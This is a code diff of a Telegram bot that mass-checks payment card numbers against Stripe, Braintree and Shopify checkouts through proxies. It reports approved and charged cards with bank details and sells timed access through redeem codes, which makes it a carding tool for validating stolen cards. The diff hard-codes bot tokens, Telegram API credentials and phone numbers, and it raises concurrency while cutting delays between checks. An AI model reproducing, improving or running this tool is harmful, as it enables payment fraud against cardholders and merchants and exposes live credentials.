@@ -30,20 +30,20 @@ from telethon import TelegramClient, events, errors
 from telethon.tl.custom import Button
 
 # ======================== CONFIGURATION ========================
-BOT_TOKEN = "8765865854:AAGh5g1ZIHfXEJVU2FAFyjhl2W1WQO9kuJg"
+BOT_TOKEN = "8547429462:AAGJ8WfZ_KXx_vn0RYGvfusGkQP2s1Kxv_I"
 PAYU_BOT_USERNAME = "@newpayubot"
 MAX_CARDS_PER_FILE_STRIPE = 10000
 MAX_CARDS_PER_FILE_BRAINTREE = 3000
 MAX_CARDS_PER_FILE_SHOPIFY = 3000
 DELAY_BETWEEN_CHECKS = 0.02       # 20ms between cards (was 0.05)
 MESSAGE_DELAY = 0.1               # 100ms between bot messages
-BOT_OWNER_ID = 8205144423
+BOT_OWNER_ID = 1140471982
 ADMINS = [BOT_OWNER_ID]
-NUM_WORKERS = 4                   # Tuned for 4 Gunicorn workers — no API spam
+NUM_WORKERS = 50                  # OPTIMISED: increased concurrency — Hostinger 8GB can handle it, API has own limits
 
-API_ID = 33424122
-API_HASH = "b4c85089f9748bf3a33f7043c64af7c5"
-PHONE_NUMBER = "+919320665632"
+API_ID = 34761547
+API_HASH = "fa613ca2a4098fec32a61c1566774d49"
+PHONE_NUMBER = "+916005341455"
 
 STORAGE_DIR = "uploads"
 PROCESSED_DIR = "processed"
@@ -55,7 +55,7 @@ FORWARD_CHAT_ID = BOT_OWNER_ID
 
 BIN_API_URL = "https://lookup.binlist.net/{}"
 
-SHOPIFY_API_URL = "https://rail-production-77d1.up.railway.app/shopify"
+SHOPIFY_API_URL = "http://91.92.241.215:8080/shopify"
 SITES_FILE = "sites.txt"
 PROXY_VALIDATION_TIMEOUT = 8
 PROXY_VALIDATION_RETRIES = 1
@@ -209,12 +209,12 @@ COUNTRY_ADDRESSES = {
 # ═══════════════ Anime UI Constants ═══════════════
 ANIME_VIDEO_URL = "https://media.tenor.com/videos/2a89c8dd4569b27e4d2e8d3b9e2e4f6e/mp4"
 ANIME_FRAMES = [
-    f"{E('🔥')} <code>⣾⣽⣻⢿⡿⣟⣯⣷  ᴅᴇᴘʟᴏʏɪɴɢ ᴄʏʙᴇʀ ᴄᴏʀᴇ...</code> {E('💀')}",
-    f"{E('⚡')} <code>▰▰▰▱▱▱▱▱  ʜᴀᴄᴋɪɴɢ ᴛʜᴇ ᴍᴀᴛʀɪx...</code> {E('🧬')}",
-    f"{E('💎')} <code>▰▰▰▰▰▱▱▱  ʟᴏᴀᴅɪɴɢ ᴋɪʟʟ ᴇɴɢɪɴᴇ...</code> {E('🗡️')}",
-    f"{E('🔮')} <code>▰▰▰▰▰▰▱▱  ꜱʏɴᴄɪɴɢ ᴅᴇᴀᴛʜ ʀᴀʏ...</code> {E('☠️')}",
-    f"{E('🌟')} <code>▰▰▰▰▰▰▰▰  ᴡᴇᴀᴘᴏɴꜱ ᴏɴʟɪɴᴇ!</code> {E('🔥')}",
-    f"{E('👑')} <code>█████████  ᴀʟʟ ꜱʏꜱᴛᴇᴍꜱ ɢᴏ — ʟᴇᴛ'ꜱ ʜᴜɴᴛ</code> {E('💀')}{E('⚡')}",
+    "🔥 <code>⣾⣽⣻⢿⡿⣟⣯⣷  ᴅᴇᴘʟᴏʏɪɴɢ ᴄʏʙᴇʀ ᴄᴏʀᴇ...</code> 💀",
+    "⚡ <code>▰▰▰▱▱▱▱▱  ʜᴀᴄᴋɪɴɢ ᴛʜᴇ ᴍᴀᴛʀɪx...</code> 🧬",
+    "💎 <code>▰▰▰▰▰▱▱▱  ʟᴏᴀᴅɪɴɢ ᴋɪʟʟ ᴇɴɢɪɴᴇ...</code> 🗡️",
+    "🔮 <code>▰▰▰▰▰▰▱▱  ꜱʏɴᴄɪɴɢ ᴅᴇᴀᴛʜ ʀᴀʏ...</code> ☠️",
+    "🌟 <code>▰▰▰▰▰▰▰▰  ᴡᴇᴀᴘᴏɴꜱ ᴏɴʟɪɴᴇ!</code> 🔥",
+    "👑 <code>█████████  ᴀʟʟ ꜱʏꜱᴛᴇᴍꜱ ɢᴏ — ʟᴇᴛ'ꜱ ʜᴜɴᴛ</code> 💀⚡",
 ]
 
 # ═══════════════ Premium Telegram Emoji IDs ═══════════════
@@ -344,7 +344,7 @@ class CardCheckerBot:
         self._api_healthy: bool = True
         self._consecutive_api_errors: int = 0
         self._api_health_fail_count: int = 0
-        self.shopify_semaphore = asyncio.Semaphore(2)
+        self.shopify_semaphore = asyncio.Semaphore(4)
 
     # ═══════════════ Rate Limiting ═══════════════
     async def _rate_limit_bot(self):
@@ -518,15 +518,15 @@ class CardCheckerBot:
             await self.safe_send_message(
                 user_id,
                 "╔═══════════════════════╗\n"
-                f"║   {E('✅')} ACCESS GRANTED   ║\n"
+                "║   ✅ ACCESS GRANTED   ║\n"
                 "╚═══════════════════════╝\n\n"
-                f"{E('🔑')} <b>Type:</b> <code>Global Access</code>\n"
-                f"{E('⏳')} <b>Expires:</b> <code>{expiry_str}</code>\n\n"
+                f"🔑 <b>Type:</b> <code>Global Access</code>\n"
+                f"⏳ <b>Expires:</b> <code>{expiry_str}</code>\n\n"
                 "💡 Use /start to begin"
             )
         except:
             pass
-        return True, f"{E('✅')} User {user_id} approved until {expiry_str}"
+        return True, f"✅ User {user_id} approved until {expiry_str}"
 
     async def approve_shopify_user(self, user_id: int, duration: str):
         dur = duration.lower().strip()
@@ -558,10 +558,10 @@ class CardCheckerBot:
             await self.safe_send_message(
                 user_id,
                 "╔═══════════════════════╗\n"
-                f"║  {E('🛒')} SHOPIFY ACCESS    ║\n"
+                "║  🛒 SHOPIFY ACCESS    ║\n"
                 "╚═══════════════════════╝\n\n"
-                f"{E('🔑')} <b>Type:</b> <code>Shopify Gateway</code>\n"
-                f"{E('⏳')} <b>Expires:</b> <code>{exp_str}</code>"
+                f"🔑 <b>Type:</b> <code>Shopify Gateway</code>\n"
+                f"⏳ <b>Expires:</b> <code>{exp_str}</code>"
             )
         except:
             pass
@@ -653,10 +653,10 @@ class CardCheckerBot:
             await self.safe_send_message(
                 user_id,
                 "╔═══════════════════════╗\n"
-                f"║  {E('🎟️')} CODE REDEEMED     ║\n"
+                "║  🎟️ CODE REDEEMED     ║\n"
                 "╚═══════════════════════╝\n\n"
-                f"{E('🔑')} <b>Type:</b> <code>Global Access</code>\n"
-                f"{E('⏳')} <b>Until:</b> <code>{exp_str}</code>\n\n"
+                f"🔑 <b>Type:</b> <code>Global Access</code>\n"
+                f"⏳ <b>Until:</b> <code>{exp_str}</code>\n\n"
                 "💡 Use /start to begin"
             )
             return True, "global"
@@ -669,10 +669,10 @@ class CardCheckerBot:
             await self.safe_send_message(
                 user_id,
                 "╔═══════════════════════╗\n"
-                f"║  {E('🎟️')} CODE REDEEMED     ║\n"
+                "║  🎟️ CODE REDEEMED     ║\n"
                 "╚═══════════════════════╝\n\n"
-                f"{E('🔑')} <b>Type:</b> <code>Shopify Access</code>\n"
-                f"{E('⏳')} <b>Until:</b> <code>{exp_str}</code>\n\n"
+                f"🔑 <b>Type:</b> <code>Shopify Access</code>\n"
+                f"⏳ <b>Until:</b> <code>{exp_str}</code>\n\n"
                 "💡 Use /start to begin"
             )
             return True, "shopify"
@@ -1498,7 +1498,7 @@ class CardCheckerBot:
             shop_url = self.normalize_site_url(site)
             async with self.shopify_semaphore:
                 result = await self.run_shopify_graphql_checkout(card_line, shop_url, current_proxy)
-            await asyncio.sleep(0.6)
+            await asyncio.sleep(0.2)
 
             info = {
                 "site": result.site_name,
@@ -1802,7 +1802,6 @@ class CardCheckerBot:
                 # Try up to SITE_TEST_RETRIES + 1 times for 503/timeout errors
                 for attempt in range(SITE_TEST_RETRIES + 1):
                     try:
-                        await asyncio.sleep(0.3)
                         result = await self._test_site_via_api(shop_url)
                         if result.get("working"):
                             async with results_lock:
@@ -2041,7 +2040,7 @@ class CardCheckerBot:
             bank = bin_info.get('bank', {}).get('name', 'Unknown')
             ctype = bin_info.get('type', 'Unknown').upper()
             bin_block = (
-                f"│  {E('🏦')} Bank:     <code>{bank}</code>\n"
+                f"│  🏦 Bank:     <code>{bank}</code>\n"
                 f"│  🔖 Brand:    <code>{brand}</code> • <code>{ctype}</code>\n"
                 f"│  {emoji} Country:  <code>{country}</code>\n"
             )
@@ -2054,24 +2053,24 @@ class CardCheckerBot:
         if include_charge:
             charge = self.extract_charge(raw)
             if charge:
-                charge_line = f"│  {E('💰')} Charged:   <code>${charge:.2f}</code>\n"
+                charge_line = f"│  💰 Charged:   <code>${charge:.2f}</code>\n"
 
         return (
             "╔══════════════════════════════════════╗\n"
-            f"║  {E('⚡')} 𝗦𝗧𝗥𝗜𝗣𝗘  ─  𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 {E('✅')}{E('🔥')}      ║\n"
+            "║  ⚡ 𝗦𝗧𝗥𝗜𝗣𝗘  ─  𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅🔥      ║\n"
             "╠══════════════════════════════════════╣\n\n"
-            f"┌──────── {E('💳')} 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
+            "┌──────── 💳 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
             "│\n"
-            f"│  {E('💳')} <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-            f"│  {E('🔢')} BIN:       <code>{cc[:6]}</code>\n"
+            f"│  💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
+            f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
             f"{bin_block}"
-            f"│  {E('🏧')} Gateway:   <code>{gateway}</code>\n"
+            f"│  🏧 Gateway:   <code>{gateway}</code>\n"
             f"{charge_line}"
             f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
             "│\n"
             "└──────────────────────────────────────┘\n\n"
-            f"{E('🟢')} Status: APPROVED {E('✅')} — ɢᴏᴛ ᴇᴍ {E('💀')}\n"
-            f"━━━ {E('💀')} ━━━ ✦ ━━━ {E('🔥')} ━━━"
+            "🟢 Status: APPROVED ✅ — ɢᴏᴛ ᴇᴍ 💀\n"
+            "━━━ 💀 ━━━ ✦ ━━━ 🔥 ━━━"
         )
 
     async def format_braintree_auth(self, card_line: str, raw: str) -> str:
@@ -2086,25 +2085,25 @@ class CardCheckerBot:
             bank = bin_info.get('bank', {}).get('name', 'Unknown')
             ctype = bin_info.get('type', 'Unknown').upper()
             bin_block = (
-                f"│  {E('🏦')} Bank:     <code>{bank}</code>\n"
+                f"│  🏦 Bank:     <code>{bank}</code>\n"
                 f"│  🔖 Brand:    <code>{brand}</code> • <code>{ctype}</code>\n"
                 f"│  {emoji} Country:  <code>{country}</code>\n"
             )
         return (
             "╔══════════════════════════════════════╗\n"
-            f"║  {E('🌐')} 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘  ─  𝗔𝗨𝗧𝗛��𝗥𝗜𝗭𝗘𝗗 {E('✅')}{E('🔥')}║\n"
+            "║  🌐 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘  ─  𝗔𝗨𝗧𝗛��𝗥𝗜𝗭𝗘𝗗 ✅🔥║\n"
             "╠══════════════════════════════════════╣\n\n"
-            f"┌──────── {E('💳')} 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
+            "┌──────── 💳 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
             "│\n"
-            f"│  {E('💳')} <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-            f"│  {E('🔢')} BIN:       <code>{cc[:6]}</code>\n"
+            f"│  💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
+            f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
             f"{bin_block}"
-            f"│  {E('🏧')} Gateway:   <code>Braintree (Auth)</code>\n"
+            f"│  🏧 Gateway:   <code>Braintree (Auth)</code>\n"
             f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
             "│\n"
             "└──────────────────────────────────────┘\n\n"
-            f"{E('🟢')} Status: AUTHORIZED {E('✅')} — ɢᴏᴛ ᴇᴍ {E('💀')}\n"
-            f"━━━ {E('💀')} ━━━ ✦ ━━━ {E('🔥')} ━━━"
+            "🟢 Status: AUTHORIZED ✅ — ɢᴏᴛ ᴇᴍ 💀\n"
+            "━━━ 💀 ━━━ ✦ ━━━ 🔥 ━━━"
         )
 
     async def format_braintree_charged(self, card_line: str, raw: str) -> str:
@@ -2119,26 +2118,26 @@ class CardCheckerBot:
             bank = bin_info.get('bank', {}).get('name', 'Unknown')
             ctype = bin_info.get('type', 'Unknown').upper()
             bin_block = (
-                f"│  {E('🏦')} Bank:     <code>{bank}</code>\n"
+                f"│  🏦 Bank:     <code>{bank}</code>\n"
                 f"│  🔖 Brand:    <code>{brand}</code> • <code>{ctype}</code>\n"
                 f"│  {emoji} Country:  <code>{country}</code>\n"
             )
         return (
             "╔══════════════════════════════════════╗\n"
-            f"║  {E('💰')} 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘  ─  𝗖𝗛𝗔𝗥𝗚𝗘𝗗 {E('🔥')}     ║\n"
+            "║  💰 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘  ─  𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥     ║\n"
             "╠══════════════════════════════════════╣\n\n"
-            f"┌──────── {E('💳')} 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
+            "┌──────── 💳 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
             "│\n"
-            f"│  {E('💳')} <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-            f"│  {E('🔢')} BIN:       <code>{cc[:6]}</code>\n"
+            f"│  💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
+            f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
             f"{bin_block}"
-            f"│  {E('🏧')} Gateway:   <code>Braintree (Charge)</code>\n"
+            f"│  🏧 Gateway:   <code>Braintree (Charge)</code>\n"
             f"│  💵 Amount:    <code>$1.00</code>\n"
             f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
             "│\n"
             "└──────────────────────────────────────┘\n\n"
-            f"{E('💰')} Status: CHARGED {E('🔥')} — ᴍᴏɴᴇʏ ʜɪᴛ {E('💣')}\n"
-            f"━━━ {E('💀')} ━━━ ✦ ━━━ {E('🔥')} ━━━"
+            "💰 Status: CHARGED 🔥 — ᴍᴏɴᴇʏ ʜɪᴛ 💣\n"
+            "━━━ 💀 ━━━ ✦ ━━━ 🔥 ━━━"
         )
 
     async def format_shopify_result(self, card_line: str, approved: bool, info: dict,
@@ -2154,21 +2153,21 @@ class CardCheckerBot:
             bank = bin_info.get('bank', {}).get('name', '?')
             ctype = bin_info.get('type', '?').upper()
             bin_block = (
-                f"│  {E('🏦')} Bank:     <code>{bank}</code>\n"
+                f"│  🏦 Bank:     <code>{bank}</code>\n"
                 f"│  🔖 Brand:    <code>{brand}</code> • <code>{ctype}</code>\n"
                 f"│  {emoji} Country:  <code>{country}</code>\n"
             )
 
         site_used = info.get("site", "unknown")
         gateway = info.get("gate", "SHOPIFY-RELOADED") or "SHOPIFY-RELOADED"
-        proxy_line = f"│  {E('🔗')} Proxy:    <code>{used_proxy[:40]}…</code>" if used_proxy else f"│  {E('🌐')} Mode:     <code>Direct Reloaded V2</code>"
+        proxy_line = f"│  🔗 Proxy:    <code>{used_proxy[:40]}…</code>" if used_proxy else "│  🌐 Mode:     <code>Direct Reloaded V2</code>"
         currency = info.get("currency", "USD")
 
         if approved:
             amount = info.get("amount", "0.00")
             reason = info.get("reason", "APPROVED")
             status_label = "CHARGED" if "CHARGED" in reason.upper() or "ORDER" in reason.upper() else "APPROVED"
-            status_icon = f"{E('💰')}" if status_label == "CHARGED" else f"{E('✅')}"
+            status_icon = "💰" if status_label == "CHARGED" else "✅"
             return (
                 "╔══════════════════════════════════════╗\n"
                 f"║  {E('🛒')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬  ─  {status_label} {E(status_icon)}{E('🔥')}      ║\n"
@@ -2178,21 +2177,21 @@ class CardCheckerBot:
                 f"┌──────── {E('💳')} 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
                 "│\n"
                 f"│  {E('💳')} <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-                f"│  {E('🔢')} BIN:       <code>{cc[:6]}</code>\n"
+                f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
                 f"{bin_block}"
                 "│\n"
                 f"├──────── {E('🌐')} 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗜𝗻𝗳𝗼 ─────────┤\n"
                 "│\n"
-                f"│  {E('🏪')} Site:      <code>{site_used}</code>\n"
-                f"│  {E('🏧')} Gateway:   <code>{gateway}</code>\n"
+                f"│  🏪 Site:      <code>{site_used}</code>\n"
+                f"│  🏧 Gateway:   <code>{gateway}</code>\n"
                 f"{proxy_line}\n"
                 f"│  {E(status_icon)} Amount:   <code>${amount} {currency}</code>\n"
                 f"│  {E('📝')} Reason:    <code>{reason}</code>\n"
                 f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
                 "│\n"
                 "└──────────────────────────────────────┘\n\n"
-                f"{E('✅')} Status: {status_label} {E(status_icon)} — ɢᴏᴛ ᴇᴍ {E('💀')}{E('🔥')}\n"
-                f"━━━ {E('💀')} ━━━ ✦ ━━━ {E('🔥')} ━━━\n"
+                f"{E('✅')} Status: {status_label} {E(status_icon)} — ɢᴏᴛ ᴇᴍ 💀{E('🔥')}\n"
+                f"━━━ 💀 ━━━ ✦ ━━━ {E('🔥')} ━━━\n"
                 "━━━ ᴄʜᴇᴄᴋᴇʀ ᴍᴀᴅᴇ ʙʏ ᴜɴᴋɴᴏᴡɴᴇɴᴛɪᴛʏ ━━━"
             )
         else:
@@ -2200,27 +2199,27 @@ class CardCheckerBot:
             amount = info.get("amount", "0.00")
             return (
                 "╔══════════════════════════════════════╗\n"
-                f"║  {E('🛒')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬  ─  𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 {E('❌')}{E('💀')}  ║\n"
+                f"║  {E('🛒')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬  ─  𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 {E('❌')}💀  ║\n"
                 "╠══════════════════════════════════════╣\n"
                 f"║  {E('💎')} Shopify Reloaded entity V2 ENGINE       ║\n"
                 "╚══════════════════════════════════════╝\n\n"
                 f"┌──────── {E('💳')} 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
                 "│\n"
                 f"│  {E('💳')} <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-                f"│  {E('🔢')} BIN:       <code>{cc[:6]}</code>\n"
+                f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
                 f"{bin_block}"
                 "│\n"
                 f"├──────── {E('🌐')} 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗜𝗻𝗳𝗼 ─────────┤\n"
                 "│\n"
-                f"│  {E('🏪')} Site:      <code>{site_used}</code>\n"
-                f"│  {E('🏧')} Gateway:   <code>{gateway}</code>\n"
+                f"│  🏪 Site:      <code>{site_used}</code>\n"
+                f"│  🏧 Gateway:   <code>{gateway}</code>\n"
                 f"{proxy_line}\n"
                 f"│  🚫 Reason:    <code>{reason}</code>\n"
                 f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
                 "│\n"
                 "└──────────────────────────────────────┘\n\n"
-                f"{E('🔴')} Status: DECLINED {E('❌')} — ᴅᴇᴀᴅ ᴄᴀʀᴅ {E('💀')}\n"
-                f"━━━ {E('💀')} ━━━ ✦ ━━━ {E('🔥')} ━━━\n"
+                f"🔴 Status: DECLINED {E('❌')} — ᴅᴇᴀᴅ ᴄᴀʀᴅ 💀\n"
+                f"━━━ 💀 ━━━ ✦ ━━━ {E('🔥')} ━━━\n"
                 "━━━ ᴄʜᴇᴄᴋᴇʀ ᴍᴀᴅᴇ ʙʏ ᴜɴᴋɴᴏᴡɴᴇɴᴛɪᴛʏ ━━━"
             )
 
@@ -2234,8 +2233,8 @@ class CardCheckerBot:
             country = bin_info.get('country', {}).get('name', 'Unknown')
             bin_line = f"BIN: {cc[:6]} | {brand} | {country}"
         return (
-            f"{E('⚡')} [{gateway.upper()} HIT]\n"
-            f"{E('💳')} {cc}|{mm}|{yy}|{cvv}\n"
+            f"⚡ [{gateway.upper()} HIT]\n"
+            f"💳 {cc}|{mm}|{yy}|{cvv}\n"
             f"{bin_line}"
         )
 
@@ -2298,7 +2297,7 @@ class CardCheckerBot:
                     text_lower = msg.text.lower()
                     # Skip intermediate loading messages
                     if any(kw in text_lower for kw in [
-                        "processing", "checking", "please wait", f"{E('⏳')}",
+                        "processing", "checking", "please wait", "⏳",
                         "loading", "wait", "fetching", "validating", "hold on"
                     ]):
                         continue
@@ -2323,18 +2322,18 @@ class CardCheckerBot:
         exp_global = self.users.get(user_id)
         if user_id in self.users:
             global_str = "♾ Permanent" if exp_global is None else exp_global.strftime("%Y-%m-%d %H:%M UTC")
-            g_icon = f"{E('🟢')}"
+            g_icon = "🟢"
         else:
             global_str = "No Access"
-            g_icon = f"{E('🔴')}"
+            g_icon = "🔴"
 
         exp_shop = self.shopify_users.get(user_id)
         if user_id in self.shopify_users:
             shop_str = "♾ Permanent" if exp_shop is None else exp_shop.strftime("%Y-%m-%d %H:%M UTC")
-            s_icon = f"{E('🟢')}"
+            s_icon = "🟢"
         else:
             shop_str = "No Access"
-            s_icon = f"{E('🔴')}"
+            s_icon = "🔴"
 
         stats = self.get_user_stats(user_id)
         checked = stats.get("total_checked", 0)
@@ -2348,7 +2347,7 @@ class CardCheckerBot:
 
         await self.safe_send_message(chat_id,
             "╔══════════════════════════════════════╗\n"
-            f"║  {E('👤')} 𝗠𝗬 𝗔𝗖𝗖𝗢𝗨𝗡𝗧                      ║\n"
+            "║  👤 𝗠𝗬 𝗔𝗖𝗖𝗢𝗨𝗡𝗧                      ║\n"
             "╠══════════════════════════════════════╣\n\n"
 
             "┌──────── 🔐 𝗔𝗰𝗰𝗲𝘀𝘀 ────────────┐\n"
@@ -2356,10 +2355,10 @@ class CardCheckerBot:
             f"│  {s_icon} Shopify:  <code>{shop_str}</code>\n"
             "└──────────────────────────────────────┘\n\n"
 
-            f"┌──────── {E('📊')} 𝗦𝘁𝗮𝘁𝘀 ─────────────┐\n"
-            f"│  {E('🔍')} Checked:  <code>{checked:,}</code>\n"
-            f"│  {E('✅')} Approved: <code>{approved:,}</code>\n"
-            f"│  {E('💰')} Charged:  <code>{charged:,}</code>\n"
+            "┌──────── 📊 𝗦𝘁𝗮𝘁𝘀 ─────────────┐\n"
+            f"│  🔍 Checked:  <code>{checked:,}</code>\n"
+            f"│  ✅ Approved: <code>{approved:,}</code>\n"
+            f"│  💰 Charged:  <code>{charged:,}</code>\n"
             f"│  📈 Hit Rate: <code>[{rate_bar}] {rate:.1f}%</code>\n"
             "└──────────────────────────────────────┘\n\n"
 
@@ -2374,26 +2373,26 @@ class CardCheckerBot:
             country = info.get('country', {}).get('name', 'Unknown')
             emoji = info.get('country', {}).get('emoji', '🌍')
             ctype = info.get('type', 'Unknown').upper()
-            prepaid = f"{E('✅')} Yes" if info.get('prepaid') else f"{E('❌')} No"
+            prepaid = "✅ Yes" if info.get('prepaid') else "❌ No"
             result = (
                 "╔══════════════════════════════════════╗\n"
-                f"║  {E('🔍')} 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣                      ║\n"
+                "║  🔍 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣                      ║\n"
                 "╠══════════════════════════════════════╣\n\n"
-                f"┌──────── {E('📋')} 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ───────────┐\n"
-                f"│  {E('🔢')} BIN:      <code>{bin_number}</code>\n"
+                "┌──────── 📋 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ───────────┐\n"
+                f"│  🔢 BIN:      <code>{bin_number}</code>\n"
                 f"│  🔖 Brand:    <code>{brand}</code>\n"
-                f"│  {E('📋')} Type:     <code>{ctype}</code>\n"
-                f"│  {E('🏦')} Issuer:   <code>{issuer}</code>\n"
+                f"│  📋 Type:     <code>{ctype}</code>\n"
+                f"│  🏦 Issuer:   <code>{issuer}</code>\n"
                 f"│  {emoji} Country:  <code>{country}</code>\n"
-                f"│  {E('💳')} Prepaid:  <code>{prepaid}</code>\n"
+                f"│  💳 Prepaid:  <code>{prepaid}</code>\n"
                 "└──────────────────────────────────────┘"
             )
         else:
             result = (
                 "╔══════════════════════════════════════╗\n"
-                f"║  {E('🔍')} 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣                      ║\n"
+                "║  🔍 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣                      ║\n"
                 "╠══════════════════════════════════════╣\n\n"
-                f"{E('❌')} No data found for BIN <code>{bin_number}</code>"
+                f"❌ No data found for BIN <code>{bin_number}</code>"
             )
         await self.safe_send_message(chat_id, result)
 
@@ -2411,10 +2410,10 @@ class CardCheckerBot:
 
     async def glowing_success(self, msg, final_text):
         glow = [
-            f"{E('💀')} <code>⟦ ꜱᴄᴀɴɴɪɴɢ ᴛᴀʀɢᴇᴛ... ⟧</code> {E('🎯')}",
-            f"{E('⚡')} <code>⟦ ᴠᴜʟɴᴇʀᴀʙɪʟɪᴛʏ ꜰᴏᴜɴᴅ! ⟧</code> {E('🗡️')}",
-            f"{E('🔥')} <code>⟦ ᴇxᴘʟᴏɪᴛɪɴɢ ɢᴀᴛᴇᴡᴀʏ... ⟧</code> {E('💣')}",
-            f"{E('👑')} <code>⟦ ᴋɪʟʟ ᴄᴏɴꜰɪʀᴍᴇᴅ ⟧</code> {E('💀')}{E('🔥')}",
+            "💀 <code>⟦ ꜱᴄᴀɴɴɪɴɢ ᴛᴀʀɢᴇᴛ... ⟧</code> 🎯",
+            "⚡ <code>⟦ ᴠᴜʟɴᴇʀᴀʙɪʟɪᴛʏ ꜰᴏᴜɴᴅ! ⟧</code> 🗡️",
+            "🔥 <code>⟦ ᴇxᴘʟᴏɪᴛɪɴɢ ɢᴀᴛᴇᴡᴀʏ... ⟧</code> 💣",
+            "👑 <code>⟦ ᴋɪʟʟ ᴄᴏɴꜰɪʀᴍᴇᴅ ⟧</code> 💀🔥",
         ]
         for g in glow:
             try:
@@ -2455,23 +2454,23 @@ class CardCheckerBot:
 
         text = (
             "╔══════════════════════════════════════╗\n"
-            f"║  {E('🌸')} 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ─ 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 {E('⚡')}         ║\n"
+            "║  🌸 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ─ 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 ⚡         ║\n"
             "╠══════════════════════════════════════╣\n\n"
             f"    {bar}\n\n"
-            f"┌──────── {E('📊')} 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ──────────┐\n"
+            "┌──────── 📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ──────────┐\n"
             "│\n"
-            f"│  {E('📃')} Done:      <code>{current}/{total}</code>\n"
-            f"│  {E('💀')} Hits:      <code>{hit_count}</code>\n"
-            f"│  {E('❌')} Declined:  <code>{declined}</code>\n"
+            f"│  📃 Done:      <code>{current}/{total}</code>\n"
+            f"│  💀 Hits:      <code>{hit_count}</code>\n"
+            f"│  ❌ Declined:  <code>{declined}</code>\n"
             f"{speed_line}"
             f"│  ⏱ Elapsed:   <code>{elapsed_str}</code>\n"
-            f"│  {E('⏳')} ETA:       <code>~{remaining_str}</code>\n"
-            f"│  {E('🔍')} Current:   <code>{card_preview[:20]}…</code>\n"
+            f"│  ⏳ ETA:       <code>~{remaining_str}</code>\n"
+            f"│  🔍 Current:   <code>{card_preview[:20]}…</code>\n"
             "│\n"
             "└──────────────────────────────────────┘"
         )
         await self.safe_edit_message(chat_id, msg_id, text,
-                                     buttons=Button.inline(f"⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 {E('🛑')}", data=f"stop_{job_id}"))
+                                     buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_{job_id}"))
 
     # ═══════════════════════════════════════════════
     # 👑 SAVAGE PREMIUM UI — Bot Handlers
@@ -2483,17 +2482,17 @@ class CardCheckerBot:
         async def start_handler(event):
             uid = event.sender_id
             if not self.has_any_access(uid):
-                btns = [[Button.inline(f"{E('🎟️')} 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲 {E('🔑')}", data="redeem_menu")]]
+                btns = [[Button.inline("🎟️ 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲 🔑", data="redeem_menu")]]
                 await event.reply(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('🔒')} 𝗔𝗖𝗖𝗘𝗦𝗦  𝗗𝗘𝗡𝗜𝗘𝗗 {E('💀')}              ║\n"
